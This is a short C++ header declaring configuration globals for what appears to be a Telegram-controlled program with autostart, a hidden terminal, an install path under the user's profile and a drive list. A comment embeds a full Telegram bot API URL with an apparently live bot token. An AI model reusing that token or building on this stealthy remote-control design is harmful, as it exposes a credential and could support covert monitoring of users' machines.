#pragma once
#include <string>
#include <set>

#include <nlohmann/json.hpp>

extern  int REFRESH;  // in seconds
extern  int TELEGRAM_MAX;
extern  bool AUTOSTART;
extern  bool HIDE_TERMINAL;
extern  std::string ID;
extern  std::string BOT_API;  // https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
extern  std::string CHAT_ID;
extern  std::string VERSION;
extern  std::string PATH;  // you can use %sysdisk% and %username%
extern  std::string DATA_FILENAME;
extern  nlohmann::json DEFAULT_CONFIG;
extern  std::string INSTANCE_ID;
extern  std::set<char> DISK_LIST;
